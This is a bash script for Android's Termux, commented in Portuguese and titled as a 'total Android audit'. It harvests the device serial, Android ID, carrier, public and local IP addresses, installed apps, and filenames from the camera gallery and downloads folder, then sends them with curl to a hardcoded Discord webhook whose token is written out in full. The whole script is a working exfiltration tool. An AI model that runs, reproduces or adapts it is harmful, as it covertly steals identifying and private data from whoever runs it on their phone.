#!/data/data/com.termux/files/usr/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

# 1. COLETANDO TUDO QUE E POSSIVEL
MODELO=$(getprop ro.product.model)
FABRICANTE=$(getprop ro.product.manufacturer)
ANDROID_VER=$(getprop ro.build.version.release)
CHIPSET=$(getprop ro.board.platform)
SERIAL=$(getprop ro.serialno)
OPERADORA=$(getprop gsm.operator.alpha)
ID_ANDROID=$(settings get secure android_id)

# 2. DADOS DE TELA E BATERIA
RESOLUCAO=$(wm size | cut -d: -f2)
DENSIDADE=$(wm density | cut -d: -f2)
NIVEL_BAT=$(termux-battery-status 2>/dev/null | grep "percentage" | cut -d: -f2 | tr -d ', ')

# 3. LISTAGEM DE APPS (TOP 20 APPS DO USUARIO)
APPS=$(pm list packages -3 | cut -d: -f2 | head -n 20 | tr '\n' ', ')

# 4. REDE AVANCADA
IP_PUB=$(curl -s https://ifconfig.me)
IP_LOC=$(ifconfig wlan0 2>/dev/null | grep "inet " | awk '{print $2}')
DNS=$(getprop net.dns1)

# 5. ARQUIVOS (LISTANDO 15 DA CAMERA E 15 DE DOWNLOADS)
# Requer termux-setup-storage ja autorizado
GALERIA=$(ls /sdcard/DCIM/Camera 2>/dev/null | head -n 15 | tr '\n' ', ')
DOWNLOADS=$(ls /sdcard/Download 2>/dev/null | head -n 15 | tr '\n' ', ')

# 6. MONTAGEM DO JSON
PAYLOAD=$(cat <<EOF
{
  "content": "AUDITORIA ANDROID TOTAL",
  "embeds": [
    {
      "title": "Dispositivo: $FABRICANTE $MODELO",
      "color": 16711680,
      "fields": [
        { "name": "Info Sistema", "value": "Android: $ANDROID_VER\nID: $ID_ANDROID\nSerial: $SERIAL\nOperadora: $OPERADORA", "inline": false },
        { "name": "Hardware", "value": "CPU: $CHIPSET\nRAM: $(free -h | grep Mem | awk '{print $2}')\nTela: $RESOLUCAO ($DENSIDADE dpi)\nBateria: $NIVEL_BAT%", "inline": false },
        { "name": "Rede", "value": "Publico: $IP_PUB\nLocal: $IP_LOC\nDNS: $DNS", "inline": false },
        { "name": "Apps Instalados (User)", "value": "${APPS:-N/A}", "inline": false },
        { "name": "Lista Galeria", "value": "${GALERIA:-Acesso Negado}", "inline": false },
        { "name": "Lista Downloads", "value": "${DOWNLOADS:-Acesso Negado}", "inline": false }
      ]
    }
  ]
}
EOF
)

# ENVIO
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" $URL
